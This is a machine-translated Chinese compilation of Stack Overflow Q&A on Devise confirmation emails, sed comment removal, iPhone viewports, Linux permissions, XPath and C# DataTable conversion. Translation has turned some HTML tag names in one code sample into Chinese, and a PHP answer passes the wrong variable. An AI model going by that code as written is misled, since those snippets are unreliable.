      successfully_updated = if password_changed
        params[:user].delete(:current_password) if params[:user][:current_password].blank?
        @user.update_with_password(params[:user])
      else
        params[:user].delete(:current_password)
        @user.update_without_password(params[:user])
      end

      if successfully_updated
        # Sign in the user bypassing validation in case his password changed
        sign_in @user, :bypass => true
        if email_changed
          flash[:blue] = "Your account has been updated! Check your email to confirm your new address. Until then, your email will remain unchanged."
        else
          flash[:blue] = "Account info has been updated!"
        end
        redirect_to edit_user_registration_path
      else
        render "edit"
      end
    end
  end
end 
```

**控制器/omniauth_callbacks_controller**

```
class OmniauthCallbacksController < Devise::OmniauthCallbacksController

  skip_before_filter :verify_authenticity_token

    def facebook
        user = User.from_omniauth(request.env["omniauth.auth"])
    if user.persisted?
      flash.notice = "Signed in!"

      # if the oauth_token is expired or nil, update it...
      if (DateTime.now > (user.oauth_expires_at || 99.years.ago) )
        user.update_oauth_token(request.env["omniauth.auth"])
      end

      sign_in_and_redirect user
    else
      session["devise.user_attributes"] = user.attributes
      redirect_to new_user_registration_url
    end
    end
end 
```

**配置/路由.rb**

```
...

devise_for :users, controllers: {omniauth_callbacks: "omniauth_callbacks", 
                                :registrations => "registrations"}

... 
```

如果需要，我很乐意提供更多信息。我也愿意自定义/覆盖设计邮件行为，但我不知道该怎么做。

非常感谢！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-25T05:51:24.663

## 解决了！

我能够覆盖 Devise::Mailer 并强制堆栈跟踪以找出导致重复电子邮件的确切原因。Devise::Mailer#confirmation_instructions 被调用了两次，我发现问题出在我的 :after_create 回调上，如下所示：

**在模型/user.rb ...**

```
after_create :account_created

# called after the account is first created
def account_created

...

  # update points
  self.points += 50
  self.save

...

end 
```

以某种方式调用 self.save 会导致邮件程序再次被触发。我通过更改添加点的时间来解决问题。我摆脱了 after_create 调用并覆盖了确认！设计方法看起来像这样：

```
def confirm!
  super
  account_created
end 
```

所以现在用户记录在确认之前不会被修改（加分）。不再有重复的电子邮件！

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-11T18:09:29.940

我最初选择了 Thomas Klemm 的答案，但是当我有空闲时间试图弄清楚发生了什么，因为感觉不对时，我回去看看这个。

我跟踪了“问题”并注意到它仅发生在您的设计（用户）模型中设置了 :confirmable 并且在设计初始化程序中启用了 reconfirmable 时 - 事后看来这很有意义，因为基本上在 after_create 我们正在改变User 模型，虽然我们没有更改电子邮件地址 - 我怀疑 Devise 可能会这样做，因为该帐户尚未确认，但无论如何**，只需调用 self.skip_reconfirmation 即可轻松停止第二封电子邮件！**在 after_create 方法中。

我创建了一个带有几个测试的示例 Rails 项目，以确保正确的行为。以下是关键摘录。如果您手头有太多时间，可以在此处查看该项目：[https ://github.com/richhollis/devise-reconfirmable-test](https://github.com/richhollis/devise-reconfirmable-test)

应用程序/模型/User.rb

```
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :confirmable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me

  after_create :add_attribute

  private

  def add_attribute
    self.skip_reconfirmation!
    self.update_attributes({ :status => 200 }, :without_protection => true)
  end
end 
```

初始化程序/devise.rb

```
# Use this hook to configure devise mailer, warden hooks and so forth.
# Many of these configuration options can be set straight in your model.
Devise.setup do |config|

  ..
  ..

  # If true, requires any email changes to be confirmed (exactly the same way as
  # initial account confirmation) to be applied. Requires additional unconfirmed_email
  # db field (see migrations). Until confirmed new email is stored in
  # unconfirmed email column, and copied to email column on successful confirmation.
  config.reconfirmable = true

  ..
  ..

end 
```

规格/模型/user_spec.rb

```
require 'spec_helper'

describe User do

  subject(:user) { User.create(:email => 'nobody@nobody.com', :password => 'abcdefghijk') }

  it "should only send one email during creation" do
    expect {
      user
    }.to change(ActionMailer::Base.deliveries, :count).by(1)
  end

  it "should set attribute in after_create as expected" do
    user.status.should eq(200)
  end

end 
```

运行 rspec 测试以确保只发送一封电子邮件确认该行为：

> ..
> 
> 在 0.87571 秒内完成 2 个示例，0 次失败

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-15T19:57:25.183

感谢您的出色解决方案，斯蒂芬！我已经尝试过了，它可以完美地融入该`confirm!`方法。但是，在这种情况下，当用户单击他收到的电子邮件中的确认链接时，将调用该函数（如名称所示）。

另一种方法是挂钩该`generate_confirmation_token`方法，因此在创建确认令牌并发送电子邮件时直接调用您的方法。

```
# app/models/user.rb
def generate_confirmation_token
  make_owner_an_account_member
  super # includes a call to save(validate: false), 
        # so be sure to call whatever you like beforehand
end

def make_owner_an_account_member
  self.account = owned_account if owned_account?
end 
```

[确认模块的相关来源](https://github.com/plataformatec/devise/blob/master/lib/devise/models/confirmable.rb)。

# ios - 将 NSURLRequest 与 UIWebView 关联起来

> ID：13061776
> 
> 赞同：5
> 
> 时间：2012-10-25T04:52:55.963
> 
> 标签：ios, uiwebview, nsurlrequest, nsurlprotocol

在 iOS 中，我希望能够将一个`NSURLRequest`- *any* `NSURLRequest`，无论是导航请求还是图像或样式表请求 - 与`UIWebView`发送它的那个相关联。这似乎需要实现一个`NSURLProtocol`子类来捕获和分析通过的请求。但是，我找不到将请求与其网络视图相关联的方法，并且`NSURLProtocol`似乎只能理解`NSURLRequest`s.

这对于导航请求来说很好，因为我可以在我的`UIWebViewDelegate`. 但这不适用于不触发`UIWebViewDelegate`方法的辅助资源请求，例如图像。

有人对建立这种关联的最佳方式有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T04:02:08.210

如果我正确理解你的问题，你可以这样做`NSURL *url = [[webView request] URL];`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-02T00:19:34.630

在您的自定义协议中，也会为引用的资源调用 canUseProtocol 委托方法。您也许可以利用这个钩子来链接您的请求，但我不确定您是否可以在不取消该请求并使用 url 执行单独的请求的情况下获得失败回调。

您关于引用资源的问题使我发现了这一发现，这使我能够解决我遇到的缓存问题。

谢谢你，我希望这有助于回报！

# google-maps - 标记使用 base64 编码的字符串

> ID：13061780
> 
> 赞同：17
> 
> 时间：2012-10-25T04:53:07.097
> 
> 标签：google-maps, base64, google-maps-markers

我正在尝试通过使用 base64 编码字符串在 Google 地图上使用自定义标记。不知何故，它不起作用。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-10-25T14:08:37.167

尝试如下操作：

```
var marker = new google.maps.Marker({
    position: latLng,
    map: map,
    title: 'hello',
    id: 'hehehe',
    icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAA..."
}); 
```

编辑：只是补充：如果你使用服务器端语言来生成 js，你总是可以插入一些 PHP/Python/任何代码来加载图像并将其转换为它的 base64 表示。

类似（PHP后端）：

```
$path = 'path/to/my/image.ext';

$info = getimagesize($info);
$ext = ($info[2]);

$data = file_get_contents($path);
$encoded = 'data:image/' . $ext . ';base64,' .base64_encode($data); 
```

然后（前端）：

```
var marker = new google.maps.Marker({
    //...
    icon: '<?=$encoded;?>'
}); 
```

# iphone - iPhone的响应宽度

> ID：13061782
> 
> 赞同：0
> 
> 时间：2012-10-25T04:53:18.553
> 
> 标签：iphone, html, css

这是我第一次构建响应式网站，当我为 iPhone 定制 CSS 时，我遇到了问题。样式都正确应用，文本改变大小，包装改变宽度。问题是 iPhone 浏览器仍然以巨大的宽度打开，请看截图：

![在此处输入图像描述](../Images/a78d8147c82d9efe3192be2c7621b98a.png)

我在用着

```
@media all and (max-device-width: 480px) {} 
```

设置特定的 iPhone css。`body {width:;}`不起作用。

谢谢您的帮助 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:57:59.027

您必须在页眉中添加以下内容

```
<meta name="viewport" content="initial-scale=1.0, width=device-width" /> 
```

如：

```
<!doctype html>
<html>
	<头部>
		<标题></标题>
		<meta name="viewport" content="initial-scale=1.0, width=device-width" />
	</head>
	<正文>
	</正文>
</html>
```

# sed - 删除多行注释

> ID：13061785
> 
> 赞同：11
> 
> 时间：2012-10-25T04:53:35.563
> 
> 标签：sed, awk

如果所有评论以 /* 开头并以 */ 结尾，我该如何删除它们？我尝试了以下方法。它适用于一行注释。

```
sed '/\/\*/d' 
```

但它不会删除多行注释。例如，第二行和第三行不会被删除。

```
/*!50500 PARTITION BY RANGE (TO_SECONDS(date_time ))
 PARTITION 20120102parti VALUES LESS THAN (63492681600),
(PARTITION 20120101parti VALUES LESS THAN (63492595200) */ ; 
```

在上面的例子中，我需要**保留最后一个；**在结束评论标志之后。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-25T05:22:17.553

这是使用`GNU sed`. 像这样跑`sed -rf script.sed file.txt`

内容`script.sed`：

```
:a
s%(.*)/\*.*\*/%\1%
ta
/\/\*/ !b
N
ba 
```

或者，这是一个班轮：

```
sed -r ':a; s%(.*)/\*.*\*/%\1%; ta; /\/\*/ !b; N; ba' file.txt 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-25T06:17:46.330

如果这是在 C 文件中，那么您必须为此使用 C 预处理器并结合其他工具来临时禁用特定的预处理器功能，例如扩展 #defines 或 #includes，所有其他方法在极端情况下都会失败。这适用于所有情况：

```
[ $# -eq 2 ] && arg="$1" || arg=""
eval file="\$$#"
sed 's/a/aA/g; s/__/aB/g; s/#/aC/g' "$file" |
          gcc -P -E $arg - |
          sed 's/aC/#/g; s/aB/__/g; s/aA/a/g' 
```

将其放入 shell 脚本并使用您要解析的文件的名称调用它，可选地以“-ansi”之类的标志作为前缀，以指定要应用的 C 标准。

有关详细信息，请参阅[https://stackoverflow.com/a/35708616/1745001](https://stackoverflow.com/a/35708616/1745001)。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-10-25T05:00:09.243

这应该做

```
 sed 's|/\*|\n&|g;s|*/|&\n|g' a.txt | sed '/\/\*/,/*\//d' 
```

对于测试：

一个.txt

```
/* Line test
multi
comment */
Hello there
this would stay 
/* this would be deleteed */ 
```

命令：

```
$ sed 's|/\*|\n&|g;s|*/|&\n|g' a.txt | sed '/\/\*/,/*\//d'
Hello there
this would stay 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-10-25T07:07:13.317

这可能对您有用（GNU sed）：

```
sed -r ':a;$!{N;ba};s|/\*[^*]*\*+([^/*][^*]*\*+)*/||' file 
```

无论如何，这是一个开始！

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-09-26T14:42:31.613

To complement Ed's answer (focused on C files), I would suggest the excellent sed script remccoms3.sed by Brian Hiles for non-C files (e.g. PL/SQL file). It handles C and C++ (//) comments and correctly skips comments inside strings. The script is available here: [http://sed.sourceforge.net/grabbag/scripts/remccoms3.sed](http://sed.sourceforge.net/grabbag/scripts/remccoms3.sed)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-05-30T15:55:43.573

尝试这个

```
sed "/^\//,/\/;/d" filename 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-19T12:23:05.880

`sed`仅解决方案：

```
sed -r 's/\/\*(.*?)\*\///g' \
    | sed -r 's/(.+)(\/\*)/\1\n\2/g'\
    | sed -r 's/(\*\/)(.+)/\1\n\2/g' \
    | sed '/\/\*/,/\*\// s/.*//' 
```

缺点：多行注释会留下空行（因为 sed 是基于行的，除非你付出了超人的努力）。

**解释**

*   `s/\/\*(.*?)\*\///g`将处理单行注释。
*   `s/(.+)(\/\*)/\1\n\2/g`并将`s/(\*\/)(.+)/\1\n\2/g`在多行注释的开头和结尾拆分行。
*   `/\/\*/,/\*\// s/.*//`将运行命令`s/.*//`有效地删除模式之间的所有行`\/\*`和`\*\/`- 这是`/*`和`*/`转义。

# date - 我在 flash builder 4.6 Flex 4.6 中找不到 s:datespinner 组件

> ID：13061786
> 
> 赞同：2
> 
> 时间：2012-10-25T04:53:38.270
> 
> 标签：date, apache-flex, flash-builder, flex4.6

我在 flash builder 4.6 中找不到 s:datespinner 组件。它使用 flex 4.6

我尝试了下面的代码

> ```
>  <?xml version="1.0" encoding="utf-8"?>
>    <s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
>                   xmlns:s="library://ns.adobe.com/flex/spark" 
>       xmlns:mx="library://ns.adobe.com/flex/mx" minWidth="955">
>                   minHeight="600">
> 
>    <s:DateSpinner x="491" y="252"/>
>    </s:Application> 
> ```

它显示以下错误

“无法解决组件实现”

在此先感谢您的帮助！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-01-13T22:01:21.953

`spark.components.DateSpinner`是最新 SDK 中的一个 AIR-only 组件，`s:Application`将使用框架的 Web 部分。如果您正在尝试制作移动应用程序，我认为您需要使用`ViewNavigatorApplication`or `TabbedViewNavigatorApplication`。

您可以在运行时版本下查看支持[的](http://flex.apache.org/asdoc/spark/components/DateSpinner.html "这里")**运行**时

# java - swing：默认激活某种输入法

> ID：13061788
> 
> 赞同：2
> 
> 时间：2012-10-25T04:53:44.640
> 
> 标签：java, swing, localization, internationalization, ime

目前，当在 Swing 应用程序中使用 java 输入法框架（作为 JRE 扩展安装 - [http://www.javadesktop.org/articles/InputMethod/index.html](http://www.javadesktop.org/articles/InputMethod/index.html)）时，我们的用户总是必须手动激活输入法热键或从应用程序系统菜单中选择。他们发现它非常恼火，想摆脱它。他们希望每次启动程序时都必须激活输入法。

有谁知道如何以编程方式选择和激活输入法（我们事先知道它是什么）？

PS。

*   这个问题是这个问题的延续：[Ubuntu上的swing应用程序的系统菜单上不显示输入法菜单项](https://stackoverflow.com/questions/12633204/input-method-menu-item-is-not-displayed-on-system-menu-of-swing-app-on-ubuntu)

*   [我们的用户使用 Ubuntu 桌面，由于这个问题https://bugs.launchpad.net/ubuntu/+source/ibus/+bug/481656](https://bugs.launchpad.net/ubuntu/+source/ibus/+bug/481656)我们无法使用带有 Swing 的 IBus，这就是我们提供 java 输入法框架解决方案的原因。

# php - 如何将所有重复参数添加到单个数组中？

> ID：13061790
> 
> 赞同：0
> 
> 时间：2012-10-25T04:53:51.363
> 
> 标签：php

我有一个包含一些重复参数的查询，如何选择重复参数并将它们放入数组中？

例如：`fruit=apple&fruit=banana&fruit=oranges&shopper=tom`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:59:31.223

尝试

```
$str = "fruit=apple&fruit=banana&fruit=oranges&shopper=tom";
$str = str_replace('fruit', 'fruit[]', $str);
parse_str($str, $output);
print_r($output['fruit']); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:29:50.820

附加了两个替代代码示例：（i）通过表单进行（ii）通过迭代和操作进行

```
<form action="test1234.php" method="GET">
    <input type="checkbox" name="fruit[]" value="apple" />apple<br />
    <input type="checkbox" name="fruit[]" value="banana" />banana<br />
    <input type="checkbox" name="fruit[]" value="orange" />orange<br />
    <br />
    <input type="checkbox" name="buyer[]" value="tom" />tom<br />
    <input type="checkbox" name="buyer[]" value="dick" />dick<br />
    <input type="checkbox" name="buyer[]" value="harry" />harry<br />
    <br />
    <input type="submit" />
</form>
<br />

<?php

var_dump($_GET); // (i) doing it via form

echo '<br /><br /><hr />';

$str = 'fruit=apple&fruit=banana&fruit=oranges&shopper=tom';

$key_value_pair_arr = explode('&', $str);

$result = array();

for($i=0; $i<count($key_value_pair_arr); $i++){

    $key_value = explode('=', $key_value_pair_arr[$i]);

    $key = $key_value[0];
    $value = $key_value[1];

    $result[$key][] = $value;
}

var_dump($result); // (ii) doing it via iteration and manipulation
?> 
```

# xml - Xpath没有获得最大值

> ID：13061793
> 
> 赞同：0
> 
> 时间：2012-10-25T04:54:18.477
> 
> 标签：xml, xpath

所以我被困在使用 Xpath 1.0 并且我似乎无法最大程度地工作......这是我的 Xpath 查询：

```
//m:REPORT_DATA[m:DATA_ITEM = 'LMP_PRC' and //m:INTERVAL_NUM[not(//INTERVAL_NUM > m:INTERVAL_NUM)]]/m:VALUE/text() 
```

我正在尝试使用 data_item=LMP_PRC 找到最高间隔数的值。唯一不起作用的部分是“and”之后的“max”。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T08:13:36.890

这会返回预期值吗？对于第二个样本，它返回 27.47472。

```
//m:REPORT_DATA[m:DATA_ITEM='LMP_PRC' and not(m:INTERVAL_NUM < //m:INTERVAL_NUM)]/m:VALUE/text() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T08:06:08.843

你的子表达式

```
//m:INTERVAL_NUM[not(//INTERVAL_NUM > m:INTERVAL_NUM)] 
```

在谓词内，这意味着您只使用它的布尔值；如果此子表达式至少选择一个节点，则为真，它总是这样做，因此条件是多余的。

如果没有看到您的更多要求，我无法帮助您更正查询。但是，我要指出，如果您的源文档是“巨大的”，那么这将需要“永远”，其中“永远”是与“巨大”平方成正比的时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T15:29:14.650

如果您使用的是 Java，那么您不会被 XPath 1.0 所困。多年来，XPath 2.0 对 Java 的支持一直可用（主要但不完全来自 Saxon）。与其用一只手绑在背后来解决这个问题，不如下载合适的工具来完成这项工作。

# c# - 文本框和 POST 的名称

> ID：13061796
> 
> 赞同：1
> 
> 时间：2012-10-25T04:54:28.853
> 
> 标签：c#, asp.net, post, asp.net-4.0

我正在尝试使用 ASP`TextBox`控件将数据从一个页面发布到另一个页面，但我无法读取其名称属性，因为它被母版页破坏了。（或者我理解）

如果我将 TextBox 的 ID 设置为`TextBox1`，那么它的名称将类似于`ctl00$BodyContent$TextBox1`阻止我通过简单地使用它的名称来可靠地读取 POST 数据。

**我应该如何解决这个问题？**

我应该改用简单的 HTML 输入标签吗？我宁愿不这样做，因为它显然不太灵活。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:10:36.280

User Control.ClientIDMode property to static.
Here is a [msdn Example](http://msdn.microsoft.com/en-us/library/system.web.ui.control.clientidmode.aspx)
For better understanding here is [another example](http://www.west-wind.com/weblog/posts/2009/Nov/07/ClientIDMode-in-ASPNET-40)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:02:35.317

您可以在客户端获取其 ID。

```
<%= TextBox.ClientID %> 
```

以上将为您提供**损坏**的ID。:)

# python - 将大型 CSV 文件加载到 Oracle 表的技术选择

> ID：13061800
> 
> 赞同：3
> 
> 时间：2012-10-25T04:54:52.153
> 
> 标签：python, csv, etl, sql-loader, smooks

我遇到了一个问题，不确定哪种技术最适合实施它。如果你们能根据你的经验给我一些建议，我将不胜感激。我想从 10-15 个 CSV 文件中加载数据，每个文件都是相当大的 5-10 GB。通过加载数据，我的意思是将 CSV 文件转换为 XML，然后使用该 XML 在 Oracle 中填充大约 6-7 个临时表。需要填充数据，以便 XML 的元素以及最终表格的行来自多个 CSV 文件。因此，例如元素 A 将具有来自 CSV 文件 1、文件 2 和文件 3 等数据的子元素。

我有一个建立在 Apache Camel 之上的框架，Linux 上的 Jboss。Oracle 10G 是数据库服务器。我正在考虑的选项，

1.  Smooks - 但是问题是 Smooks 一次序列化一个 CSV，我不能坚持半生不熟的 Java bean 直到读取其他 CSV 文件，因为考虑到 bean 的数量，我冒着内存不足的风险在将它们完全填充为 XML 写入磁盘之前，我需要创建并保留它们。
2.  SQLLoader - 我可以一起跳过 XML 创建并使用 SQLLoader 将 CSV 直接加载到临时表。但我不确定我是否可以。将 SQL Loader 中的多个 CSV 文件加载到相同的表中，在第一个文件之后更新记录。湾。在加载临时表时应用一些翻译规则。
3.  用于将 CSV 转换为 XML 的 Python 脚本。
4.  SQLLoader 加载与 CSV 数据相对应的一组不同的临时表，然后编写存储过程以从这组新的临时表中加载实际的临时表（考虑到对我现有框架的更改量，我想避免的路径它需要）。

提前致谢。如果有人能指出我正确的方向或从他/她的个人经历中给我一些见解，这将有助于我做出明智的决定。

问候，-v-

PS：CSV 文件相当简单，每个大约 40 列。对象的深度或文件之间的关系将在 2 到 3 左右。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:22:19.670

除非您可以使用一些成熟的 ETL 工具（例如 Informatica PowerCenter、Pentaho 数据集成），否则我建议使用第 4 种解决方案 - 它简单且性能应该不错，因为 Oracle 将处理任务中最复杂的部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-12T21:56:34.263

在 Informatica PowerCenter 中，您可以导入/导出 XML 的 +5GB.. 作为 Marek 响应，尝试一下，因为它的工作速度非常快..如果您不熟悉此工具，[这里有一个简要介绍。](http://gerardnico.com/wiki/powercenter/powercenter)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-21T23:24:41.190

创建一个进程/脚本，它将调用一个过程以将 csv 文件加载到外部 Oracle 表中，并创建另一个脚本以将其加载到目标表中。
您还可以添加 cron 作业来调用这些脚本，这些脚本将跟踪传入目录中的 csv 文件、处理它并将 csv 文件移动到输出/处理文件夹。
也可以通过记录或发送电子邮件来相应地处理异常。祝你好运。

# iphone - 在运行时修改目标 c 中的常量

> ID：13061803
> 
> 赞同：0
> 
> 时间：2012-10-25T04:55:15.277
> 
> 标签：iphone, objective-c, ios, xcode, constants

我正在尝试解决以下问题。我的头文件中有以下常量：

```
#define PREFS_MY_CONSTANT_1 @"bla1"
#define PREFS_MY_CONSTANT_2 @"bla2"
#define PREFS_MY_CONSTANT_3 @"bla3"
... 
```

在我的一个函数中，我想根据用户输入将这些字符串之一打印到 UIbutton，所以说用户输入“1”，我会显示 bla1。我没有创建一个巨大的开关（我有 100 个），而是寻找一种将常量与保存用户输入的变量结合起来的方法，所以理想情况下是这样的：

```
NSInteger input;
[button setTitle:PREFS_MY_CONSTANT_{$input} forState: UIControlStateNormal]; 
```

这样的事情可能吗？解决这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T05:08:04.730

I'd define a plain C array of NSString literals:

```
static NSString *prefs[] = {
    @"foo",
    @"bar",
    @"baz",
}; 
```

Either use a 0-based index, or put something in the first entry you won't use, like `nil`. Then `prefs[input]` will give you the string you want.

(The comma after the last entry isn't a mistake. It allows you to add more entries without first having to add a comma. It makes it easier to edit, and makes revision history easier to read.)

The number of elements in a static array can be determined at compile time. I usually use a macro for this:

```
#define ARRAYSIZE(array) (sizeof(array) / sizeof(array[0])) 
```

Then you can compare the user input against `ARRAYSIZE(prefs)` to make sure it stays within the range.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T05:08:25.653

another way is to use `NSArray` for this.

create an array like this:

```
NSArray *titleArray = [[NSArray alloc] initWithObjects:@"bla1",@"bla2",@"bla3", nil]; 
```

and you can set the title of button following way:

```
[button setTitle:[titleArray objectAtIndex:input] forState: UIControlStateNormal]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:00:43.710

为此`NSString`，作为

```
NSString *input = [NSString stringWithFormat:@"PREFS_MY_CONSTANT_%@",input];
[button setTitle:input forState: UIControlStateNormal];

          or
 [button setTitle:[NSString stringWithFormat:@"PREFS_MY_CONSTANT_%@",input] forState:     UIControlStateNormal]; 
```

让我知道它是否有用。

谢谢和问候， 阿尼尔

# linux - 为什么我不能在 Linux 中查看目录？

> ID：13061806
> 
> 赞同：0
> 
> 时间：2012-10-25T04:55:37.640
> 
> 标签：linux

我正在设置一个运行 apache 的 Linux Web 服务器。我上传并解压了我的网站文件。当我通过 SSH 进入系统时，主目录中的文件都是可见的。但是，我被所有子目录阻止。如果我写：

```
# cd images 
```

然后我得到错误：

```
-bash: cd: images: Permission denied 
```

我以 ec2-user 身份登录。我将这些东西解压为 ec2-user 并且我怀疑 tar 文件中是否有任何权限，因为我在 Windows 系统上创建了存档。奇怪的是我是这个目录的所有者。这是命令的片段： ls -l

```
drw-rw-r-- 19 ec2-user ec2-user      4096 May  4 04:09 images 
```

当我执行“sudo su”然后键入命令 cd images 时，一切都很好。如果我是所有者并且拥有 rw 权限，为什么我作为 ec2-user 会收到“权限被拒绝”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:58:36.140

您也需要执行权限：

```
chmod +x images 
```

应该照顾它。目录的执行权限转换为“遍历目录”权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:57:22.250

它错过了目录上的可执行位，这对于能够`cd`在那里执行是必不可少的。

一个快速的解决方法是在你解压你的东西的目录中运行：

```
# find . -type d | xargs chmod a+x 
```

如果您的目录中有空格，请使用以下命令：

```
# find . -type d -exec chmod a+x "{}" \; 
```

# c# - 界面设计（WCF/Remoting）

> ID：13061811
> 
> 赞同：2
> 
> 时间：2012-10-25T04:55:52.437
> 
> 标签：c#, wcf, interface, remoting

我有两个接口

```
public interface IServer1
{
[OperationContract(IsOneWay = false)]
void Subscribe();

[OperationContract(IsOneWay = false)]
[ServiceKnownType(typeof(ABC))]       
List<ABC> GetActiveData();
} 
```

和另一个界面

```
public interface IServer2
{
void Subscribe(IClient client);

List<ABC> GetActiveData(IClient client);
} 
```

一个接口用于 WCF 通信，另一个用于远程处理。为此创建两个接口让我很恼火。将有两个不同的代理来实现这些接口。

这可以只用一个界面来完成吗？或者最好有两个接口。此外，在未来，除了 WCF 和远程处理之外，可能还会出现其他一些进程间通信模式，因此也不想为此创建另一个接口。

至于删除远程处理和使用 WCF 仅作为其庞大的代码库无法做到这一点。不想进行额外的测试等工作。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:41:31.097

我将遵循封装不同概念的建议。在您的情况下，服务接口似乎是一致的，但通信模式可能会改变。

为客户端创建一个接口并通过工厂暴露接口。在 Factory 中，根据使用的通信模式，创建代理对象并将调用委托给代理对象。这也将封装服务接口，即服务接口可能是一个或可能不同，除非服务接口提供相同的操作，否则客户端不需要更改。引入新的通信模式只需要对 Factory 类进行单元测试，客户端代码不需要进行单元测试。

# java - 如何在没有 EventListener 的情况下以编程方式在 JList 中添加元素？

> ID：13061812
> 
> 赞同：1
> 
> 时间：2012-10-25T04:55:54.967
> 
> 标签：java, swing, netbeans, event-handling, jlist

我想从不是任何事件侦听器的用户定义函数在 JList 中添加元素。

我有 JList 作为：

```
DefaultListModel listModel = new DefaultListModel();
JList jList1 = new JList(listModel);
listModel.add(0,"Welcome");
listModel.addListDataListener(new MyListDataListener());

class MyListDataListener implements ListDataListener {
        public void contentsChanged(ListDataEvent e) {
             //DefaultListModel model = (DefaultListModel)e.getSource();
            //jList1.setModel(listModel);
            System.out.println("inside content");
        }
        public void intervalAdded(ListDataEvent e) {
           // jList1.setModel(listModel);
            jList1.setListData(a);
            //System.out.println("inside added"+e.getSource()+" "+jList1.getModel());

        }
        public void intervalRemoved(ListDataEvent e) {

        }
    } 
```

因为，每当我想从鼠标单击的侦听器中添加元素时，都会调用 intervalAdded，因为

```
private void sendButtonMouseClicked(java.awt.event.MouseEvent evt) {                                        
        // TODO add your handling code here:
        if(!inputField.getText().isEmpty())
        {
            message=myName+" : "+inputField.getText();

        listModel.add(GlobalVariable.i,message);

        inputField.setText(null);
        GlobalVariable.i++;
        }

    } 
```

也来自我的用户定义函数，即

```
public void messagereceived(String s)
    {
                 listModel.add(GlobalVariable.i,message);
                 GlobalVariable.i++;
} 
```

但是`listModel.setmodel()`无论何时从 messagereceived() 函数调用它都不起作用。

如何从此函数在 JList 中添加元素？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T08:02:30.840

1.  在`messagereceived`中，您不是在打电话`listModel.setmodel()`，而是`listModel.add(GlobalVariable.i,message);`
2.  当您调用时，`jList1.setListData(a);`您正在隐式创建和设置一个新的 ListModel `jList1`。因此，当您`listModel`修改`jList1`.
3.  `GlobalVariable`--> 看起来像是一些古老的 C 代码风格的标志。适当地使用对象。

# asp.net-mvc - 如何将数据表转换为 IList C#

> ID：13061813
> 
> 赞同：0
> 
> 时间：2012-10-25T04:56:01.803
> 
> 标签：asp.net-mvc, datatable, converter, ilist, ext.net

**当我构建项目时，它有一个这样的错误：**

> “/”应用程序中的服务器错误。
> 
> 传递到字典中的模型项的类型为“System.Data.DataTable”，但此字典需要类型为“System.Collections.Generic.IList`1[TLayout.Models.DemoTable]”的模型项。

**这是我的控制器**

```
public ActionResult Index()
        {
            var dm = new DemoTable();
            string connstring = "Server=localhost;Port=5432;User Id=postgres;Password=123456;Database=test";
            NpgsqlConnection conn = new NpgsqlConnection(connstring);
            conn.Open();
            string sql = "select * from demo";
            NpgsqlDataAdapter da = new NpgsqlDataAdapter(sql, conn);
            ds.Reset();
            da.Fill(ds);
            dt = ds.Tables[0];
            var demoid = dm.demoid.ToString();
            var demoname = dm.demoname;
            for (int i = 0; i < dt.Rows.Count; i++)
            {
                List<DataTable> dtb = new List<DataTable>();
                demoid = dt.Rows[i]["demoid"].ToString();
                demoname = dt.Rows[i]["demoname"].ToString();
                dtb.Add(dt);
            }
            return View(dt);
        } 
```

**这是我的视图，用于向布局显示数据：**

```
foreach (var item in Model)
{
    fields.Add(Html.X().ModelField().Mapping(@item.demoid.ToString()).Name("grid-alarm"));
    fields.Add(Html.X().ModelField().Mapping(@item.demoname.ToString()).Name("grid-check"));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T05:09:55.997

```
var list = dt.AsEnumerable()
             .Where(row => (int)row["demoid"] > 5)
             .Select(row => new
              {
                 demoid = Convert.ToInt32(row["demoid"]),
                 demoname = row["demoname"] != null ? 
                            row["demoname"].ToString() : 
                            String.Empty
              }).ToList(); 
```

或者你可以定义类：

```
public class myClass
{
  public int demoid;
  public string demoname;
} 
```

接着：

```
List<myClass> list = dt.AsEnumerable()
             .Where(row => (int)row["demoid"] > 5)
             .Select(row => new myClass
             {
                 demoid = Convert.ToInt32(row["demoid"]),
